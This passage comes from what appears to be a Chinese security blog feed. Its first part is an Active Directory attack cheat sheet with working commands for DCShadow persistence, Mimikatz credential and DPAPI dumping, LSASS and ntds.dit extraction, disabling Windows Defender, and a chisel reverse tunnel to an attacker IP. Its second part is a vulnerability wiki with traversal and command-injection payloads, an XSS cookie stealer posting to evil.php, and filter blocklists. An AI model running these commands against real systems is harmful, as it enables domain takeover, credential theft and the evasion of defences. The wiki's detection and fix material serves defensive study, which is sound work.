Admin特权，则可以将其用于林级别的持久性。 （可选）作为域管理员，为选定的用户提供DCShadow攻击所需的特权（使用Set-DCShadowPermissions.ps1cmdlet）。 1Set-DCShadowPermissions -FakeDC mcorp-student35 -SamAccountName root355user -Username student355 -Verbose 然后，在任何计算机上，使用Mimikatz进行DCShadow攻击。 123456789101112131415# 为用户设置SPNlsadump::dcshadow /object:root355user /attribute:servicePrincipalName /value:&quot;SuperHacker/ServicePrincipalThingey&quot;# 设置用户的SID历史记录（有效地授予他们企业管理员权限）lsadump::dcshadow /object:root355user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519# 为用户设置AdminSDHolder容器上的完全控制权限## 需要检索当前的ACL：(New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local&quot;)).psbase.ObjectSecurity.sddl## 然后获取目标用户的SID：Get-NetUser -UserName student355 | select objectsid## 最后，添加完全控制原语 (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for userlsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45109) 最后，从DA会话或以前提供DCShadowPermissions的用户的会话中，运行DCShadow攻击。先前上演的动作将在不保留日志的情况下执行😈 1lsadump::dcshadow /push Post-ExploitationLSASS保护有时，LSASS被配置为作为受保护进程（PPL）运行。您可以使用PowerShell进行查询，如下所示。 1Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" 在这种情况下，您不仅可以转储或解析LSASS，还需要使用禁用该保护mimidrv.sys。我不会在这里讨论如何做。 Dumping secrets with Mimikatz123456789101112# 转储登录密码sekurlsa::logonpasswords# 从DC转储所有域散列## 注意：带有/patch的所有内容都很嘈杂，因为它_writes_到LSASS🚩lsadump::lsa /patch# 仅转储本地用户lsadump::sam# DCSync (requires &apos;ldap&apos; SPN)lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local Windows Credential Vault转储 我在和一起使用时遇到了一些问题Invoke-Mimikatz.ps1。如果遇到问题，请尝试使用本机Mimikatz。 1234567891011121314151617# 转储Windows机密，例如计划任务的存储凭据（先提升权限）vault::listvault::cred /patch# 转储Windows机密DPAPI方法（噪音少，没有特定权限，需要）## 更多信息: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials## 首先，获取特定密钥的主密钥的GUIDdpapi::cred /in:C:\Users\appadmin\AppData\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D## LSASS的EITHER Grab dpapi键sekurlsa::dpapi## 或抓取并缓存特定密钥dpapi::masterkey /rpc /in:C:\Users\appadmin\AppData\Roaming\Microsoft\Protect\S-1-5-21-3965405831-1015596948-2589850225-1118\a89b97d2-b520-462d-a924-d57df68c543b## Mimikatz将缓存主密钥（使用dpapi::cache检查）## Then run the initial dpapi::cred command again to get the juice! 没有Mimikatz的密码hash转储我们也可以解析系统机密，而无需在目标系统上直接使用Mimikatz。 Dumping LSASS运行Mimikatz的首选方法是使用目标中LSASS内存的转储副本在本地进行。Dumpert，Procdump或其他（自定义）工具可用于转储LSASS内存。 123# 通过进程快照（-r）转储LSASS内存，避免与之直接交互.\procdump.exe -r -ma lsass.exe lsass.dmp# 或者任务管理器找到lsass.exe进程右键创建转储文件 在我们的攻击系统上下载内存转储文件后，我们可以运行Mimikatz并切换到“ Minidump”模式以如下方式解析文件。 12sekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full Dumping secrets from the registry我们可以从注册表中转储机密并“离线”解析文件，以获取系统机密列表。🚩 在目标上，我们运行以下命令： 123reg.exe save hklm\sam c:\users\public\downloads\sam.savereg.exe save hklm\system c:\users\public\downloads\system.savereg.exe save hklm\security c:\users\public\downloads\security.save 然后，在我们的攻击盒子上，我们可以使用Impacket丢弃秘密： 1impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL &gt; secrets.out ntdsutilntdsutil win2008开始DC中自带的工具 123456789#交互式ntdsutilsnapshotactivate instance ntdscreatemount [GUID]# copy 完之后再执行unmout [GUID]del [GUID] 12345# 非交互式ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &#123;GUID&#125;" quit quitcopy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.ditntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit QuarkPwDump分析 [下载地址][https://github.com/quarkslab/quarkspwdump]在线提取（直接在目标主机执行，实战中不选择此方式。） 1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit 离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取 1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt ntdsutil: ifm 模块WINDOWS SERVER 2008-2016 123456C:\&gt; ntdsutilntdsutil: activate instance ntdsntdsutil: ifmifm: create full c:\auditifm: quitntdsutil: quit 使用NtdsAudit.exe下载地址解出ntds的hash 1NtdsAudit.exe "ntds.dit" -s "SYSTEM" -p pwdump.txt --users-csv users.csv NtdsAudit需要ntds.dit Active Directory数据库，SYSTEM 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置ntdsutil实用程序。 以管理员身份打开命令提示符（cmd.exe）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。 12345678910111213# 在命令提示符下，键入以下命令，然后按ENTER键：ntdsutil# 在ntdsutil提示符下，键入以下命令，然后按Enter：activate instance ntds# 在ntdsutil提示符下，键入以下命令，然后按Enter：ifm# 在ifm提示符下，键入以下命令，然后按Enter：create full &lt;Drive&gt;:\&lt;Folder&gt;# &lt;Drive&gt;:\&lt;Folder&gt; 是要创建的文件的文件夹路径。 例如，以下命令将显示统计信息，输出pwdump.txt包含密码哈希值的文件，并输出users.csv包含每个用户帐户详细信息的文件。 1ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv Linux 明文密码的获取mimipenguin git clone https://github.com/huntergregal/mimipenguin 支持的操作系统 os service supported Ubuntu Desktop 12.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Ubuntu Desktop 16.04 LTS x64 gnome-keyring-daemon (3.18.3) Y Fedora Workstation 25 (x86_64) gnome-keyring-daemon (3.20.0) Y Fedora Workstation 27 (x86_64) gnome-keyring-daemon (3.20.1) Y Kali-rolling x64 gnome-keyring-daemon (3.28.0.2) Y 从卷影副本中转储快照我们还可以创建SAM和SYSTEM文件的“卷影副本” （它们始终锁定在当前系统上），因此我们仍然可以将它们复制到本地系统中。为此需要提升的提示 123wmic shadowcopy call create Volume='C:\'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\samcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system 关闭Windows Defender👀🚩 123Set-MpPreference -DisableRealtimeMonitoring $trueSet-MpPreference -DisableIOAVProtection $true 或将Defender保持启用状态，然后从其中删除签名。 1"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Chisel 代理这是一个有关如何设置Socks代理以在受感染主机上进行凿凿的示例。凿子还可以做更多的事情！ 在攻击者机器（Linux或Windows）上： 1./chisel server -p 8888 --reverse 目标执行： 1.\chisel_windows_386.exe client 10.10.16.7:8888 R:8001:127.0.0.1:9001 现在，我们正在侦听localhost:8001攻击机，以将流量转发给target:9001。 然后，打开Socks服务器。估计的正好： 1.\chisel_windows_386.exe server -p 9001 --socks5 在攻击机上： 1./chisel client localhost:8001 socks 现在，在攻击计算机的端口1080上打开了一个代理。 Juicy files有很多文件可能包含有趣的信息。WinPEAS类的工具或PowerSploit类的集合可能有助于识别多汁的文件（用于privesc或post-exploitation）。 以下是我遇到过的一些相关文件的列表。根据计算机上安装的程序和/或服务检查文件。 此外，不要忘记使用sqlcmd或枚举任何本地数据库Invoke-SqlCmd。 123456789101112131415161718192021222324252627282930# 所有用户文件夹## 如果文件太多，请限制此命令;）tree /f /a C:\Users# Web.configC:\inetpub\www\*\web.config# Unattend 文件C:\Windows\Panther\Unattend.xml# RDP 配置文件C:\ProgramData\Configs\# Powershell scripts/config 文件C:\Program Files\Windows PowerShell\# PuTTy 配置文件C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty# FileZilla 证书C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml# Jenkins creds (also check out the Windows vault, see above)C:\Program Files\Jenkins\credentials.xml# WLAN profilesC:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml# TightVNC 密码 (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>域</tag>
        <tag>备忘录</tag>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞安全知识Wiki]]></title>
    <url>%2F2020%2F12%2F04%2F%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86Wiki.html</url>
    <content type="text"><![CDATA[漏洞安全知识Wiki 本文从漏洞类型的维度进行知识体系的整理，包含了漏洞介绍、漏洞危害、攻击案例、检测方法、解决方案的内容，部分漏洞类型从代码层了解此类漏洞原理及修复方法。持续更新。 任意文件上传漏洞描述 文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严或Webserver相关解析漏洞未修复而造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过Web 访问的目录上传任意文件，包括网站后门文件（Webshell），进而远程控制网站服务器。 漏洞危害 非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为Webshell，也可将Webshell脚本称为一种网页后门，Webshell脚本具有非常强大的功能，比如查看服务器目录、。服务器中的文件，执行系统命令等。 攻击案例 12345678910111213// 定义图片所在的目标位置var allow_ext = ".jpg|.png|.gif"; // 上传的文件将被保存。$target = "pictures/" . basename($_FILES['uploadedfile']['name']);// 将上传的文件移动到新位置。if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))&#123;echo "The picture has been successfully uploaded.";&#125;else&#123;echo "There was an error uploading the picture, please try again.";&#125; 对应用平台的攻击 将.jsp文件上传到Web tree——以Web用户身份执行的JSP代码 上传.gif文件以重新调整大小——利用图片库漏洞 上传大文件——文件空间拒绝服务 使用恶意路径或名称上传文件——覆盖关键文件 上载包含个人数据的文件——其他用户可以访问它 上载包含“标签”的文件——标签被执行为“包含”在网页中的一部分 上载要由防病毒软件扫描的.rar文件——在运行易受攻击的防病毒软件的服务器上执行的命令 检测方法 检测前端代码可以通过JS禁用，尝试上传其他后缀名格式的文件看是否上传成功； 检测content-type，通过修改content-type的文件类型尝试上传目标格式文件； 检测文件头判断文件类型，通过使用常见的文件头的hex编码来确认文件类型； 检测目标是否存在IIS解析漏洞，假设上传一个名为&quot;test.asp;xxx.jpg&quot;时，该文件会被当做asp文件解析； 检测目标是否有Apache解析漏洞，检测目标是否可以使用%00截断等； 修复建议 对上传文件类型进行限制，并且不能只做前端的限制，而要前端和后端一起限制，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小，或是将上传的文件放在安全的路径下，尽量放于Web server之外的远程服务器等。 严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关目录的执行权限，防范Webshell攻击。 对上传文件格式进行严格校验及安全扫描，防止上传恶意脚本文件； 设置权限限制，禁止上传目录的执行权限； 严格限制可上传的文件类型； 严格限制上传的文件路径。 文件扩展名服务端白名单校验。 文件内容服务端校验。 上传文件重命名。 隐藏上传文件路径。 任意文件下载漏洞描述 某些网站可能因为业务需要，提供文件查看或者下载的功能，如果对用户查看或者需要下载的文件不做限制，那么一些攻击者可能构造恶意代码下载网站的敏感文件（源代码，数据库文件，登录密码等）。 漏洞危害 可以下载目标服务器的任意文件，如网站源码、网站配置文件、系统配置文件等。 通过获取的源码进行代码审计，进一步获得可利用的漏洞。 攻击案例 场景1：用header()下载： 123456&lt;?php $filename = "uploads/abc.jpg"; header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename));?&gt; ​ Payload： 12vul.php?file=/etc/passwdvul.php?file=../../../../../../../../etc/passwd 检测方法 12345678910111213141516../探测：download.php?filename=aa/../xxx.doc ../../../../etc/passwddownload.php?f=ﬁle:///etc/passwddownload.php?f=../ download.php检测以下url参数：&amp;RealPath=&amp;FilePath=&amp;filepath=&amp;Path=&amp;path=&amp;inputFile=&amp;url=&amp;Lang=&amp;dis=&amp;data=&amp;readfile=&amp;src 修复建议 对下载路径进行过滤，如下载前对传入的参数进行过滤，并且对下载文件类型进行检查，是否是允许下载的类型，另外禁止使用回溯符../ ； 正则严格判断用户输入参数的格式； php.ini配置open_basedir限定文件访问范围 任意文件删除漏洞描述 未经授权访问者可以进行删除文件、附件、图片、替换、配置等。 漏洞危害 攻击者利用此漏洞可直接删除Web目录甚至服务器上任意格式文件，直接导致业务系统中断、崩溃。 攻击案例 场景1：存在任意文件删除的代码示例：构造服务器上已有文件或文件夹payload，即可删除目标服务器的文件或文件夹。 123456789101112131415161718public function del()&#123; $dir = $this-&gt;input-&gt;get_post('id',true); if(empty($dir))&#123; getjson(L('plub_11')); &#125; $dirs = array(); if(!is_array($dir))&#123; $dirs[] = $dir; &#125;else&#123; $dirs = $dir; &#125; foreach($dirs as $dir) &#123; deldir(FCPATH.'attachment/backup/'.$dir); &#125; $info['msg'] = L('plub_12'); $info['url'] = site_url('basedb/restore').'?v='.rand(1000,9999); getjson($info,0); &#125; 检测方法 判断代码里是否有进行删除操作的函数，对提交的参数进行简单的判断，然后在输入的参数拼接服务器上已有测试文件的目录，删除成功则表示目标存在任意文件删除漏洞。 修复建议 限制文件删除函数可删除的目录位置以及文件类型 文件名非用户可控 禁止使用回溯符../ 缓冲区溢出漏洞描述 缓冲区溢出错误的特征是覆盖了进程的内存片段，这些内存片段永远不要有意或无意地修改。IP（指令指针），BP（基本指针）和其他寄存器的值覆盖会导致异常，分段错误和其他错误发生。通常，这些错误会以意外的方式终止应用程序的执行。当我们对char类型的缓冲区进行操作时，会发生缓冲区溢出错误。缓冲区溢出可以包括溢出堆栈（堆栈溢出）或溢出堆（堆溢出）。 漏洞危害 缓冲区溢出通常会导致崩溃。导致缺乏可用性的其他攻击也是可能的，包括将程序置于无限循环中。 缓冲区溢出可用于执行任意代码，这通常超出程序隐式安全策略的范围。 当后果是执行任意代码时，通常可以使用它来颠覆任何其他安全服务。 攻击案例 场景1：缓冲区大小是固定的，但不能保证argv [1]中的字符串不会超过该大小并引起溢出。 12345#define BUFSIZE 256int main(int argc, char **argv) &#123;char buf[BUFSIZE];strcpy(buf, argv[1]);&#125; 检测方法 在检查代码中是否存在堆栈溢出时，建议搜索对不安全的库函数（如gets()，strcpy()，strcat()等）的调用，这些函数不会验证源字符串的长度，并盲目地将数据复制到固定大小的缓冲区中。 当将可变大小的数据复制到位于程序堆栈上的固定长度缓冲区而不进行任何边界检查时，就会发生堆栈溢出。 OWASP检测方案： https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.2-Testing_for_Stack_Overflow.html https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.1-Testing_for_Heap_Overflow.html 修复建议 不使用strcpy()、sprintf()等不安全的函数，而要在strncpy()、memcpy()、snprinf()的基础上封装出安全的函数，对copy进buffer的内容大小进行限制，超过大小则截断。 空指针漏洞漏洞描述 Null Pointer空指针的引用，对于空指针的错误引用往往是由于在引用之前没有对空指针做判断，就直接使用空指针，还有可能把空指针作为一个对象来使用，间接使用对象中的属性或是方法，而引起程序崩溃，空指针的错误使用常见于系统、服务、软件漏洞方面。当应用程序取消引用它期望是有效的但为NULL的指针时，就会发生NULL指针取消引用，通常会导致崩溃或退出。 漏洞危害 造成程序的崩溃，退出或重新启动。 执行未经授权的代码或命令；读取内存；修改内存。 在极少数情况下，当NULL等于0x0内存地址并且特权代码可以访问它时，就可以写入或读取内存，这可能导致代码执行。 攻击案例 场景1：以下步骤将确保程序不发生空指针取消引用。 1234if (pointer1 != NULL) &#123;/* make use of pointer1 *//* ... */&#125; 场景2：在以下代码中，程序员假定系统始终定义了名为“cmd”的属性。如果攻击者可以控制程序的环境，从而未定义“cmd”，则当程序尝试调用trim()方法时，该程序将引发NULL指针异常。 1234//Example Language: Java String cmd = System.getProperty("cmd");cmd = cmd.trim(); 检测方法 自动化动态分析：可以使用动态工具和技术来检测到此弱点，这些工具和技术可以使用具有大量不同输入的大型测试套件与软件进行交互，例如模糊测试（fuzzing），稳定性测试和故障注入。该应用程序的操作可能会变慢，但不应变得不稳定，崩溃或产生错误的结果。 手动动态分析：确定正常使用期间不太可能发生的错误情况并触发它们。例如，在内存不足的情况下运行该程序，没有足够的特权或权限运行该程序，在进程完成之前中断该进程，或禁用与基本网络服务（例如DNS）的连接，监控应用程序是否有意外错误行为。如果您触发了未处理的异常或由应用程序的环境发现并处理的类似错误，则它可能仍指示应用程序本身未处理的意外情况。 修复建议 如果在使用之前对所有可能已修改的指针进行了完整性检查，则可以防止几乎所有的NULL指针取消引用。 在返回值之前，请检查所有返回值的函数的结果，并验证该值是否为非空值。 识别所有从外部来源接收信息的变量和数据存储，并应用输入验证以确保它们仅被初始化为期望值。 在声明过程中或在第一次使用之前，显式初始化所有变量和其他数据存储。 格式化字符串漏洞描述 当应用程序将输入字符串的提交数据作为命令评估时，就会发生Format String攻击。通过这种方式，攻击者可以执行代码，读取堆栈或在正在运行的应用程序中引起分段错误，从而导致可能损害系统安全性或稳定性的新行为。 漏洞危害 如果服务器端代码将用户输入与格式字符串连接在一起，则攻击者可能会附加其他转换说明符，从而导致运行时错误，信息泄露或缓冲区溢出。 如果攻击者通过修改格式字符串来利用这些功能，则可能导致信息泄露和代码执行。 攻击成功可能造成修改数据、读取数据、获得权限、远程命令执行。 攻击案例 场景1: 导致格式字符串漏洞的代码模式是对包含未经处理的用户输入的字符串格式函数的调用。以下示例显示了调试如何printf使程序易受攻击： C中的示例： 1234char *userName = /* input from user controlled field */;printf("DEBUG Current user: ");//存在漏洞的调试代码printf(userName); Java中的示例： 12345final String userName = /* input from user controlled field */;System.out.printf("DEBUG Current user: ");// 存在漏洞的代码:System.out.printf(userName); 在此特定示例中，如果攻击者将其设置userName为具有一个或多个转换说明符，则将出现有害的行为。C示例将打印出内存内容（如果userName包含）%p%p%p%p%p，并且如果%n字符串中有a，它可能会破坏内存内容。在Java示例中，username包含任何需要输入（包括%x或%s）的说明符的都会导致导致程序崩溃IllegalFormatException。尽管示例仍然存在其他问题，但是可以通过使用printf参数修复该漏洞printf(&quot;DEBUG Current user: %s&quot;, userName)。 检测方法 存在漏洞的先决条件：目标应用程序必须接受字符串作为用户输入，无法清理用户输入中的字符串格式字符，并使用解释字符串格式字符的函数来处理此字符串。 静态分析工具可以在代码或二进制文件中找到格式字符串漏洞。工具示例包括： C和C ++：Flawfinder Java：FindSecurityBugs规则FORMAT_STRING_MANIPULATION PHP：phpsa中的字符串格式分析器 手动代码检查：静态分析可能会错过更复杂的情况，包括复杂代码生成的格式字符串。要在代码库中手动查找漏洞，测试人员可以在代码库中查找所有接受格式字符串的调用，然后回溯以确保不受信任的输入无法更改格式字符串。 手动注入：测试人员可以使用Web浏览器或其他Web API调试工具执行手动测试。浏览到Web应用程序或网站，以使查询具有转换说明符。请注意，如果大多数转换说明符在URL中发送，则需要进行编码，因为它们包含特殊字符，包括%和{。该测试可以%s%s%s%n通过使用以下URL浏览来引入说明符字符串： 1https://vulnerable_host/userinfo?username=%25s%25s%25s%25n ​ 如果网站容易受到攻击，则浏览器或工具应收到错误消息，其中可能包括超时或HTTP返回码500。 ​ Java代码返回错误 1java.util.MissingFormatArgumentException: Format specifier '%s' 根据`C`的实现，该过程可能会完全崩溃`Segmentation Fault`。 修复建议 限制格式化字符串函数的使用。 输入验证：必须对所有用户可控制的输入进行验证并过滤掉非法格式字符。 跨站脚本攻击（XSS）漏洞描述 跨站脚本攻击（Cross-site scripting，简称XSS攻击），通常发生在客户端，可被用于进行隐私窃取、钓鱼欺骗、密码偷取、恶意代码传播等攻击行为。XSS攻击使用到的技术主要为HTML和Javascript脚本，也包括VBScript和ActionScript脚本等。 恶意攻击者将对客户端有危害的代码放到服务器上作为一个网页内容，用户不经意打开此网页时，这些恶意代码会注入到用户的浏览器中并执行，从而使用户受到攻击。一般而言，利用跨站脚本攻击，攻击者可窃取会话cookie，从而获得用户的隐私信息，甚至包括密码等敏感信息。 存在三种XSS类型，通常针对用户的浏览器： 反射式XSS：应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告或类似内容。 存储式XSS：你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。 基于DOM的XSS：会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript API。 典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户侧的攻击。 漏洞危害 网络钓鱼，包括盗取各类用户账号 窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作 劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送电子邮件等 强制弹出广告页面，刷流量等 网页挂马 进行恶意操作，例如任意篡改页面信息，删除文章等 进行大量的客户端攻击，如DDOS攻击 获取客户端信息，例如用户的浏览历史，真实ip，开放端口等 控制受害者机器向其他网站发起攻击 结合其他漏洞进一步扩大攻击 提升用户权限，包括进一步渗透网站 传播XSS跨站脚本蠕虫等 攻击案例 场景1：以下JSP代码段从HTTP请求读取员工ID eid，并将其显示给用户。 123&lt;% String eid = request.getParameter("eid"); %&gt;... Employee ID: &lt;%= eid %&gt; 如果eid仅包含标准字母数字文本，则此示例中的代码将正确运行。如果eid的值包含元字符或源代码，则该代码将由Web浏览器执行，因为它显示HTTP响应。 场景2：获取目标用户Cookie 如果应用程序不验证输入数据，则攻击者可以轻松地从经过身份验证的用户那里窃取cookie。攻击者所需要做的就是将以下代码放置在任何张贴的输入中（即：留言板，私人消息，用户个人资料）： 123&lt;SCRIPT type="text/javascript"&gt;var adr = '../evil.php?cakemonster=' + escape(document.cookie);&lt;/SCRIPT&gt; 上面的代码会将cookie的转义内容（根据RFC内容必须先转义，然后才通过GET方法通过HTTP协议将其发送）传递给“cakemonster”变量中的evil.php脚本。攻击者然后检查其evil.php脚本的结果（cookie抓取程序脚本通常会将cookie写入文件）并使用它。 检测方法 XSS常见测试语句： 1234&lt;script&gt;alert(xss)&lt;/script&gt;&lt;img src=x onerror=alert(xss)&gt;&lt;svg onloda=alert(xss)&gt;&lt;a href=javascript:alert(xss)&gt; 修复建议 拒绝将不受信任的数据放入HTML文档中，验证所有用户输入数据，有效检测攻击；对所有输出数据进行适当的编码，以防止任何已成功注入的脚本在浏览器端运行。 将不受信任的数据插入HTML元素内容之前进行HTML转义。在规范中建议使用命名实体进行转义： 123456&amp; --&gt; &amp;amp;&lt; --&gt; &amp;lt;&gt; --&gt; &amp;gt;" --&gt; &amp;quot;' --&gt; &amp;#x27;/ --&gt; &amp;#x2F; HTML属性编码转义：除字母数字字符外，请以HTML实体&amp;#xHH;格式转义所有字符，包括空格（HH=十六进制值）。 URL编码：对URL参数值进行URL编码。URL编码标准，参考 https://www.w3schools.com/tags/ref_urlencode.asp。 JavaScript编码：除字母数字字符外，请以\uXXXX Unicode转义格式（X =整数）转义所有字符。 CSS十六进制编码：CSS转义支持\XX和\XXXXXX。如果下一个字符继续转义序列，则使用两个字符转义会导致问题。有两种解决方案（a）在CSS转义符后添加一个空格（CSS解析器将忽略该空格）（b）使用通过零填充该值而可能的全部CSS转义。 过滤以下常见字符： 1234567891011121314151617|&amp; ; $%@'"\'\"&lt;&gt;()+CR（回车符，ASCII 0x0d）LF（换行，ASCII 0x0a）,\ 命令注入漏洞描述 命令注入是一种攻击，其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）传递给系统shell时，可能会发生命令注入攻击。在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。命令注入攻击很可能主要是由于输入验证不足。 系统命令注入（也称为shell注入）是一个Web安全漏洞，它使攻击者可以在运行应用程序的服务器上执行任意系统（OS）命令，并且通常会完全破坏该应用程序及其所有数据。攻击者通常可以利用OS命令注入漏洞来破坏托管基础架构的其他部分，利用信任关系将攻击转移到组织内的其他系统。 漏洞危害 当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）传递给系统shell时，可能会发生命令注入攻击。在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。 攻击者可以执行未经授权的命令，然后可以使用这些命令来禁用目标系统的应用软件，或者读取和修改攻击者没有权限直接访问的数据。 成功利用此漏洞会造成：执行未经授权的代码或命令；DoS：崩溃，退出或重新启动；读取/修改文件或目录；读取应用数据；修改申请数据； 攻击案例 命令注入漏洞通常在以下情况下发生： 数据从不受信任的来源进入应用程序。 数据是由应用程序作为命令执行的字符串的一部分。 通过执行命令，应用程序为攻击者提供了攻击者无法拥有的特权或功能。 场景1：在.PHP页面的URL末尾添加分号，后跟操作系统命令，将执行该命令。%3B URL编码并解码为分号。 1http://sensitive/something.php?dir=%3Bcat%20/etc/passwd 场景2：以下PHP代码段容易受到命令注入攻击： 123456&lt;?phpprint("Please specify the name of the file to delete");print("&lt;p&gt;");$file=$_GET['filename'];system("rm $file");?&gt; 请求和响应是成功攻击的示例： 12345&lt;!--请求--&gt;http://127.0.0.1/delete.php?filename=bob.txt;id&lt;!--响应--&gt;Please specify the name of the file to deleteuid=33(www-data) gid=33(www-data) groups=33(www-data) 检测方法 cmd1|cmd2：使用|将使命令2执行成功，而命令1执行成功与否。 cmd1;cmd2：使用;将使命令2执行成功，而命令1执行成功与否。 cmd1||cmd2 ：仅当命令1执行失败时，才会执行命令2。 cmd1&amp;&amp;cmd2 ：仅当命令1执行成功时，才会执行命令2。 $(cmd)：例如，echo $(whoami)或$(touch test.sh; echo &#39;ls&#39; &gt; test.sh) cmd：用于执行特定命令。例如，whoami &gt;(cmd)： &gt;(ls) &lt;(cmd)：&lt;(ls) 修复建议 需要清理URL和表单数据中的无效字符。可以将字符列入黑名单，但是可能很难想到要针对其进行验证的所有字符。也可能有一些尚未被发现。应该创建仅包含允许的字符或命令列表的白名单，以验证用户输入。此列表应消除错过的角色以及未发现的威胁。 可以包括用于命令注入的常规黑名单： 1| ; &amp; $ &gt; &lt; &apos; \ ! &gt;&gt; # 对于Windows转义或过滤以下特殊字符： 1( ) &lt; &gt; &amp; * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , 对于Linux，转义或过滤以下特殊字符： 1&#123; &#125; ( ) &gt; &lt; &amp; * ‘ | = ? ; [ ] $ – # ~ ! . ” % / \ : +`, 审查以下函数 Java 1Runtime.exec() C/C++ 123systemexecShellExecute Python 123456execevalos.systemos.popensubprocess.popensubprocess.call PHP 12345sytemshell_execexecproc_openeval ​ （1）尽量不要执行外部的应用程序或命令，严格过滤用户输入的数据，禁止执行非预期系统命令。 ​ （2）使用自定义函数或函数库实现外部应用程序或命令的功能。 ​ （3）在执行system、eval等命令执行功能的函数前，确定参数内容。 ​ （4）使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“;”会被转义为“\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。 ​ （5）使用safe_mode_exec_dir执行可执行的文件路径。将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录中，并使用safe_mode_exec_dir指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。 代码注入漏洞描述 用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。代码以目标应用程序的语言注入，并由该语言的服务器端解释器执行——PHP，Python，Java，Perl，Ruby等。 代码注入与命令注入的不同之处在于，攻击者仅受注入语言本身的功能的限制。如果攻击者能够将PHP代码注入到应用程序中并执行该代码，则它们仅受PHP能力的限制。命令注入包括利用现有代码来执行命令，通常是在shell上下文中执行。 漏洞危害 通过注入的代码可以访问直接阻止攻击者访问的资源。 